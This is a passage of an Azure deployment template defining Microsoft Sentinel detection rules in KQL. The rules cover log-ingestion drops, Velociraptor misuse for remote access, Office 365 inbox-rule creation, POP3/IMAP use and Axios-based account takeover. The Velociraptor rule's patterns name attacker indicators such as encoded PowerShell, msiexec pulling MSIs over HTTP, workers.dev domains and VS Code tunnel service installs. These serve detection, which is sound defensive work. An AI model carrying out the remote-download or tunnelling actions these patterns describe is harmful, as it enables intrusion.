          "query": "let latency = 0h;  \nlet start_time = 1h;\nlet end_time = now(); \nlet DeviationSlider = 2;\nlet DeviationThreshold = 100;\nlet suppression_time = 2d;\nlet start_time_historical = 14d;   \nlet RecentAlerts = toscalar(SecurityAlert\n  |where TimeGenerated between (ago(suppression_time) .. now())\n  | where AlertName startswith 'BV-9051:'\n  |parse AlertName with * ' Decrease In ' * 'From ' host_name\n  |summarize make_set_if(host_name, isnotempty(host_name)), eventcount=count()\n  );      \nlet Previous9053Alerts = toscalar(SecurityAlert\n  | where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has 'BV-9053:'\n  | parse AlertName with * 'offline' * '[' host ']'\n  | extend host = split(replace_string(host, '\"', ''), ',')\n  | summarize make_set_if(host, host[0] <> ''));         \nlet Baseline = CommonSecurityLog\n| where TimeGenerated between (startofday(ago(start_time_historical)) .. endofday(ago(1d)))\n| project Computer, TimeGenerated, DeviceName, DeviceVendor, DeviceProduct\n| extend Computer = iif(isnotempty(Computer), DeviceName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9051_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\nand tolower(DeviceVendor) matches regex tolower(BV9051_CONFIG['EXCLUDED_HOST']) == false and tolower(DeviceProduct) matches regex tolower(BV9051_CONFIG['EXCLUDED_HOST']) == false\n| project Computer, TimeGenerated\n| summarize EventCount = count() by Computer, bin(TimeGenerated, 1d)\n| summarize percentile_EventCount_25=percentiles(EventCount, 25),percentile_EventCount_75=percentiles(EventCount, 75),percentile_EventCount50=percentiles(EventCount, 50),MaxCount=max(EventCount),AvgCount=avg(EventCount),MinCount=min(EventCount), NumberofDays = countif(isnotempty(TimeGenerated)) by Computer\n| extend CandleBody = percentile_EventCount_75 - percentile_EventCount_25\n      | extend MyDeviation = CandleBody * DeviationSlider\n      | where MyDeviation  > DeviationThreshold and NumberofDays >= 3\n      | where AvgCount between (1 .. 99999)\n;\nCommonSecurityLog\n| where TimeGenerated between (startofday(ago(1d)) .. startofday(now()))\n| project Computer, TimeGenerated, DeviceName, DeviceVendor, DeviceProduct\n| extend Computer = iif(isnotempty(Computer), DeviceName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9051_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\nand tolower(DeviceVendor) matches regex tolower(BV9051_CONFIG['EXCLUDED_HOST']) == false and tolower(DeviceProduct) matches regex tolower(BV9051_CONFIG['EXCLUDED_HOST']) == false\n| project Computer, TimeGenerated\n| summarize TodayEventCount = count() by Computer\n| join kind=inner (Baseline) on Computer\n      | extend AlertThreshold = iff(MinCount < MyDeviation, MyDeviation-MinCount, MinCount-(MyDeviation))\n      , PercentBelowMin = round(100- ((TodayEventCount * 1.0)/(MinCount * 1.0) * 100), 2)\n                        |extend day_of_week = toint(dayofweek(now())/1d)\n                |extend day_name = case(\n                    day_of_week == '1', 'monday'\n                    ,day_of_week == '2', 'tuesday'\n                    ,day_of_week == '3', 'wednesday'\n                    ,day_of_week == '4', 'thursday'\n                    ,day_of_week == '5', 'friday'\n                    ,day_of_week == '6', 'saturday'\n                    ,day_of_week == '0', 'sunday'\n                    ,'')\n      | extend week_day = iff(day_name has_any ('saturday', 'sunday'), false, true)\n| extend threshold = case(\n    day_name has_any ('saturday', 'sunday'), 95, // Default weekend threshold\n    week_day == true, 60,                       // Default weekday threshold\n    50)\n// Apply configured thresholds if present\n| extend threshold = case(\n    day_name in (BV9051_CONFIG['THRESHOLD'][0]['day_name']), BV9051_CONFIG['THRESHOLD'][0]['value'],\n    week_day == BV9051_CONFIG['THRESHOLD'][1]['week_day'], BV9051_CONFIG['THRESHOLD'][1]['value'],\n    threshold)\n, PercentBelowMin = iff(PercentBelowMin < 0, -PercentBelowMin, PercentBelowMin)\n, PercentBelowAvg = round(100- ((TodayEventCount * 1.0)/(AvgCount * 1.0) * 100), 2)\n| where TodayEventCount < AlertThreshold or PercentBelowMin > threshold\n| where PercentBelowAvg > threshold\n| extend Tags = 'tag: Health' \n        , bv_start_time = now()\n        , bv_datatype = 'CommonSecurityLog'\n        , bv_mss_category = 'Ingestion outlier'\n        , bv_alarm_type = 'Usage'\n        , bv_alarm_subtype = 'Usage - Decrease'\n        , bv_alarm_name = 'BV-9051'\n        , bv_alarm_threshold = threshold\n        , bv_alarm_value = PercentBelowMin\n        , bv_severity = 'medium'\n        , sourcetype = 'CommonSecurityLog'          \n        , bv_src_dvc = Computer\n        , bv_event_count = TodayEventCount\n        , bv_min_count = MinCount\n        , bv_avg_count = round(AvgCount,0)\n        , bv_event_threshold = AlertThreshold\n        , bv_percent_below_avg = PercentBelowAvg\n| extend ExtendedDescription = iff(TodayEventCount < AlertThreshold, strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \", representing a \", bv_percent_below_avg, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"),\n              strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \" with a previous minimum count of \", bv_min_count, \" representing a \", bv_alarm_value, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"))\n|project-keep  ExtendedDescription, Tags, sourcetype\n  , bv_* ",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": "2025-09-04T00:00:00.000Z",
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9051: [Health] CommonSecurityLog - Ingestion - Decrease In Log Volumes From {{bv_src_dvc}}",
            "alertDescriptionFormat": "This alert identifies a significant decrease in log volume for a specific host in the CommonSecurityLog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected ranging from 1 to 99,999 per day.\n{{ExtendedDescription}} \nCategory: Ingestion outlier\n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11605')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11605')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11605: [SOC] Defender - Use Of DFIR Tools For Remote Access",
          "description": "This detection identifies the unauthorized deployment of DFIR tools such as Velociraptor as a remote access mechanism. While these tools are typically legitimate used for forensic investigations, threat actors have been misconfiguring Velociraptor to maintain remote access, often deploying it with malicious intents, such as data exfiltration or lateral movement within compromised environments. This detection focuses on observing irregular tool deployments and commands indicating potential misuse for malicious purposes. MITRE: T1569,T1036,T1105,T1218,T1572,T1219,T1203 Category: DefenderXDR,Microsoft Defender XDR,Windows Security Events tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let alert_id = 'BV-11605';\nlet alert_type = 'SOC';\nlet end_time = now();\nlet start_time = 15m;\nlet EventIDList = dynamic([4688]);\nlet start_time_suppress = 1d;\nlet alert_bin = 15m;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])     \n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11605_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11605_CONFIG['RBASCORE']),real(1.0));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};  \nlet ProcessEvents = materialize(\nunion isfuzzy=true\n(DeviceProcessEvents\n| where TimeGenerated between (ago(start_time) .. end_time)\n| where ActionType == 'ProcessCreated'\n| project\n    TimeGenerated\n    , bv_src_dvc = tolower(DeviceName)\n    , bv_src_dvc_id = DeviceId\n    , bv_user = AccountName\n    , bv_file_name = FileName\n    , bv_process_command_line = ProcessCommandLine\n    , bv_parent_process_file_name = InitiatingProcessFileName\n    , bv_parent_process_command_line = InitiatingProcessCommandLine\n    , bv_folder_path = FolderPath\n    , bv_sourcetype = Type\n    , bv_parent_process_name = ''\n),\n(SecurityEvent\n| where TimeGenerated between (ago(start_time) .. end_time)\n| where EventID in (EventIDList)\n| where strlen(CommandLine) > 5 \n| project \n    TimeGenerated\n    , bv_process_command_line = CommandLine\n    , bv_src_dvc = tolower(Computer)\n    , bv_src_dvc_id = ''\n    , bv_file_name = Process\n    , bv_folder_path = ''\n    , bv_parent_process_file_name = ''\n    , bv_parent_process_command_line = ''\n    , bv_sourcetype = Type\n    , bv_parent_process_name = ParentProcessName\n    , bv_user = coalesce(SubjectUserName, TargetUserName)\n));\nlet EncodedCmdEvents = ProcessEvents\n| where bv_process_command_line has \"powershell.exe\" and bv_process_command_line has '-encodedCommand' and (bv_parent_process_command_line has 'Velociraptor.exe' or bv_parent_process_name has 'Velociraptor.exe')\n      | parse kind=regex flags=i bv_process_command_line with * '-EncodedCommand ' encodedCommand\n      | extend encodedCommand = tostring(split(encodedCommand, ' ')[0])              \n      | extend decodedCommand = replace('\\\\x00', '', base64_decodestring(tostring(encodedCommand)))  \n      | extend bv_decodedCommand = iif(strlen(decodedCommand) > 10, decodedCommand, bv_process_command_line)\n      | where bv_decodedCommand has 'code.exe' or bv_decodedCommand  has_any (\"workers.dev\", \"qaubctgg\")\n;\nlet ExecEvents = ProcessEvents\n| where \n    (bv_process_command_line has_any (\"msiexec\", \"cmd.exe\") and bv_process_command_line has_any (\"workers.dev\", \"qaubctgg\", \"sc.msi\", \"velo.\", \"v2.msi\") and bv_process_command_line has_any (\"http\", \"https\"))\n    or\n    (bv_process_command_line has \"powershell.exe\" and bv_process_command_line has '-encodedCommand' and bv_process_command_line has_any (\"workers.dev\", \"qaubctgg\", \"code.exe\"))\n    or\n    (bv_process_command_line has_all (\"code.exe\", \"cmd.exe\") and bv_process_command_line has_any (\"tunnel\", \"--accept-server-license-terms\") and bv_process_command_line has 'service install')\n    or\n    (bv_parent_process_command_line has \"Velociraptor.exe\" and bv_process_command_line has_any (\"c:\\\\users\\\\public\\\\\", \"\\\\users\\\\public\\\\\") and bv_process_command_line has_any (\"i.log\"))\n| project-keep TimeGenerated, bv_*\n;    \nunion isfuzzy=true (EncodedCmdEvents), (ExecEvents)\n| summarize bv_event_count = count()\n    , bv_start_time = min(TimeGenerated)\n    , bv_end_time = max(TimeGenerated)\n    , bv_file_name = make_set(bv_file_name, 5)\n    , bv_process_command_line = make_set(bv_process_command_line, 2)\n    , bv_parent_process_file_name = make_set(bv_parent_process_file_name, 5)\n    , bv_parent_process_command_line = make_set(bv_parent_process_command_line, 5)\n    , bv_folder_path = make_set(bv_folder_path, 5)\n    , bv_decoded_command = make_set(bv_decodedCommand, 5)    \nby bv_src_dvc, bv_src_dvc_id, bv_user\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n    , bv_dedup_hash = hash_sha1(strcat(bv_src_dvc,bv_user))\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash              \n| extend \n    bv_alarm_attacker_entities = pack_array(bv_src_dvc)\n    , bv_alarm_victim_entities = pack_array(bv_user)\n    , bv_mapping_tag = bv_user\n| project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT15M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Execution",
            "CommandAndControl"
          ],
          "techniques": [
            "T1569",
            "T1036",
            "T1105",
            "T1218",
            "T1572",
            "T1219",
            "T1203"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11605: [SOC] Defender - Use Of DFIR Tools For Remote Access on host {{bv_src_dvc}} by {{bv_user}}",
            "alertDescriptionFormat": "This detection identifies the unauthorized deployment of DFIR tools such as Velociraptor as a remote access mechanism. While these tools are typically legitimate used for forensic investigations, threat actors have been misconfiguring Velociraptor to maintain remote access, often deploying it with malicious intents, such as data exfiltration or lateral movement within compromised environments. This detection focuses on observing irregular tool deployments and commands indicating potential misuse for malicious purposes.\n\n{{ExtendedDescription}}\n\ntag: SOC\nCategory: Microsoft Defender XDR\nMITRE: T1569 MITRE: T1036 MITRE: T1105 MITRE: T1218 MITRE: T1572 MITRE: T1219 MITRE: T1203"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-113')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-113')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-113: [RBA] O365 - Inbox Rule Created",
          "description": "Identifies when Office 365 Inbox Rules are created MITRE: T1114 Category: DefenderXDR,Microsoft Defender XDR tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 10m;\nlet end_time = now();\nlet latency = 30m;\nlet alert_id = 'BV-113:';\nlet start_time_suppress = 4h;\nlet global_config = dynamic({\n  'RBASCORE': 1\n});\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV113_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};      \nOfficeActivity\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where Operation has 'InboxRule' and Operation !has 'disable'\n| extend bv_object_attr = parse_json(Parameters)\n| mv-apply p= bv_object_attr on\n    (\n    extend FolderName = iff(p.Name == 'MoveToFolder' and isnotempty(p.Value), p.Value, '')\n    | extend RuleName = iff(p.Name == 'Name' and isnotempty(p.Value), p.Value, '')\n    | summarize\n        bv_folder_name = make_set_if(FolderName, isnotempty(FolderName)),\n        bv_rule_name = make_set_if(RuleName, isnotempty(RuleName))\n    )      \n| extend \n      bv_start_time = Start_Time\n      , bv_alert_time = TimeGenerated\n      , bv_alarm_time = now()\n      , bv_src_user = UserId\n      , bv_src_ip = ClientIP\n      , bv_object = OfficeObjectId\n      , bv_object_category = 'email'\n      , bv_object_attr_category = 'rule'\n      , bv_mitre_id = 'T1114'\n      , visibility = dynamic(['0'])\n| invoke rba_score_calculator('BV-113')\n| extend bv_alarm_rba_score = iff(bv_folder_name[0] has_any ('RSS', 'Conversation History') or (bv_rule_name[0] matches regex @'^[^\\w\\s-]+' and strlen(bv_rule_name[0]) <= 5) or (bv_folder_name[0] has 'Archive' and Parameters has '{\"Name\":\"MarkAsRead\",\"Value\":\"True\"}' and strlen(bv_rule_name[0]) <= 5)\nor (bv_folder_name[0] has 'Deleted Items' and not(bv_rule_name[0] has_any ('Move all messages', 'For all messages')) and array_length(split(bv_rule_name[0], ' ')) <= 2), BV113_CONFIG['RBASCORE'], bv_alarm_rba_score)\n| parse bv_src_user with bv_src_user_name '@' bv_src_user_domain\n| extend VictimEntity = pack_array(bv_src_user_name)\n      , bv_dedup_hash = hash_sha1(bv_src_user_name)\n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash       \n| extend ExtendedDescription = strcat(\n  'bv_src_user: ', bv_src_user, '\\n' \n  , 'bv_src_ip: ', bv_src_ip, '\\n' \n  , 'bv_object: ', bv_object, '\\n' \n  , 'bv_object_attr: \\n* ', strcat_array(bv_object_attr, '\\n* '), '\\n\\n' \n  , 'RBAScore: ', bv_alarm_rba_score)\n| project-keep\n      bv_*\n      , VictimEntity\n      , ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT4H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Identifies when Office 365 Inbox Rules are created\n\n{{ExtendedDescription}}\n\nMITRE: T1114\nCategory: Office 365\ntag: RBA             "
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "RBAScore": "bv_alarm_rba_score",
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-214')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-214')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-214: [Hygiene] Palo Alto - Internal hosts using POP3 or IMAP email clients",
          "description": "This alert identifies the top 50 internal hosts accessing unsanctioned SMTP/IMAP/POP3 servers. MITRE: T1041,T1071 Category: Palo Alto Networks tag: Hygiene",
          "severity": "Low",
          "enabled": true,
          "query": "let NetworksToExclude = print nets = A214_FILTER_NETWORKS\n| mv-expand nets\n| extend ForJoin = 'ForJoin';\nlet ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 2d; // earliest [log time] boundary\nlet ProtocolList = dynamic(['tcp/110', 'tcp/143', 'tcp/993', 'tcp/995', 'tcp/25','tcp/465', 'tcp/587', 'tcp/2525']);\nCommonSecurityLog\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where DeviceAction =~ 'allow'\n| where SourceIP matches regex PRIVATE_IP\n| extend Protocol = strcat(tolower(Protocol), '/', DestinationPort)\n| where Protocol in~ (ProtocolList)\n| where DestinationIP !in (WHITELISTED_IPS)\n| where SourceIP !in (WHITELISTED_IPS)\n| where SourceIP !in (WHITELISTED_SCANNERS)\n| summarize Connections=count(), ReceivedBytes=sum(ReceivedBytes), SentBytes=sum(SentBytes), Destinations=tostring(make_set(DestinationIP, 5)) by SourceIP, ApplicationProtocol, Protocol\n| sort by Connections desc\n| extend ForJoin = 'ForJoin'\n| join NetworksToExclude on ForJoin\n| where ipv4_is_match(SourceIP, tostring(nets)) == true\n| project SourceIP, Destinations, Connections, ReceivedBytes, SentBytes, ApplicationProtocol, Protocol",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration",
            "CommandAndControl"
          ],
          "techniques": [
            "T1041",
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1935')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1935')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1935: [SOC] EntraID - Suspected Axios Based Account Takeover",
          "description": "This rule detects suspected account takeover attempts using Axios HTTP client user agents against Microsoft 365 environments. Correlates authentication events across SigninLogs, ADFS, CloudAppEvents, and AADUserRiskEvents to identify high-confidence compromise indicators. MITRE: T1078,T1110,T1557 Category: Entra ID,Microsoft Defender XDR tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-1935';\nlet alert_type = 'SOC';\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet start_time_suppress = 1d;\nlet latency = 1h;\nlet start_time = 4h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({\n'EXCLUSION': dynamic([{}]), 'excluded_dedup_hash_fields': dynamic([''])});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1935_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1935_CONFIG['RBASCORE']),1.0);\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\n let match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\n let description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', 